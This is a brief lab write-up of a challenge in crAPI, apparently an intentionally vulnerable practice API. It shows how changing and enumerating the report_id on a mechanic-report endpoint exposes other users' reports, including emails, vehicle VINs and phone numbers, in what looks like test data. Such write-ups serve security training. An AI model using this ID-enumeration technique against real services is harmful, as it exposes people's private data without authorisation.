# Access mechanic reports of other users

crAPI allows vehicle owners to contact their mechanics by submitting a "contact mechanic" form. This challenge is about accessing mechanic reports that were submitted by other users.

- Analyze the report submission process

* Find an hidden API endpoint that exposes details of a mechanic report
* Change the report ID to access other reports

# Notes

Submitting form at endpoint `/workshop/api/merchant/contact_mechanic`

Response:

```
{
    "response_from_mechanic_api":{
        "id":7,
        "sent":true,
        "report_link":"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=7"
    },
    "status":200
}
```

In the request there is a report link `http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=7`.
Attempted to access page but server returns a 401, `{"message":"JWT Token required!"}`

Adding my existing JWT token enable me to view the report.

```
{
    "id":7,
    "mechanic":{
        "id":1,
        "mechanic_code":"TRAC_JHN",
        "user":{
            "email":"jhon@example.com",
            "number":""
        }
    },
    "vehicle":{
        "id":6,
        "vin":"5AWXX79OBDK351103",
        "owner":{
            "email":"b@mail.com",
            "number":"1234"
        }
    },
    "problem_details":"testing",
    "status":"pending",
    "created_on":"07 February, 2025, 13:06:28"
}
```

Fuzzing throuhg the report_id, 7 report was identified. The reports was increment by 1 and stating with 1 and end with 7.
